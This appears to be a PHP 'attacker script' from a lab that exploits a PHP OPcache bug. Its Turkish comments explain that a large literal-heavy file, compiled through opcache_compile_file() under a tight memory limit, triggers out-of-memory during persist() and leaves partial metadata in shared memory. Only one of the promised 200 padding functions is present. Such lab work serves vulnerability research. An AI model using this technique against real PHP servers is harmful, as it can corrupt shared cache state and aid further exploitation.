<?php
/**
 * Bug 4 Lab: Attacker Script (buyuk, persist sirasinda OOM tetikleyici)
 *
 * Bu script bilerek buyuktur: cok sayida literal, fonksiyon ve class
 * icererek opcache_compile_file() sirasinda yuksek bellek tuketir.
 * memory_limit ince ayarlandiginda, persist() ortasinda OOM olur
 * ve SHM'de partial metadata kalir.
 *
 * Buyukluk hedefi: ~1-2MB derlenmis opcode + literal tablosu.
 * Exploit bunu trigger_persist.php uzerinden cache'lemeye calisir.
 *
 * SADECE LAB.
 */

// ---- 200 fonksiyon, her biri 50 string literal ----
// Her fonksiyon ~10KB SHM tuketir; toplam ~2MB
// OPcache persist() bu literal'leri SHM'e kopyalarken OOM olabilir

<?php
// Generate heavy literal content for OPcache
// Each function contains many string constants that OPcache must persist

function atk_fn_0() {
    $a = array();
    $a[] = "attacker_literal_00_pad_" . str_repeat("A", 200);
    $a[] = "attacker_literal_01_pad_" . str_repeat("B", 200);
    $a[] = "attacker_literal_02_pad_" . str_repeat("C", 200);
    $a[] = "attacker_literal_03_pad_" . str_repeat("D", 200);
    $a[] = "attacker_literal_04_pad_" . str_repeat("E", 200);
    $a[] = "attacker_literal_05_pad_" . str_repeat("F", 200);
    $a[] = "attacker_literal_06_pad_" . str_repeat("G", 200);
    $a[] = "attacker_literal_07_pad_" . str_repeat("H", 200);
    $a[] = "attacker_literal_08_pad_" . str_repeat("I", 200);
    $a[] = "attacker_literal_09_pad_" . str_repeat("J", 200);
    return $a;
}

// Bu dosya calistirilmaz; sadece opcache_compile_file() ile persist edilir.
// Gercek attacker.php, tools/generate_attacker_script.py ile uretilir.
echo "This script should only be compiled, not executed.\n";
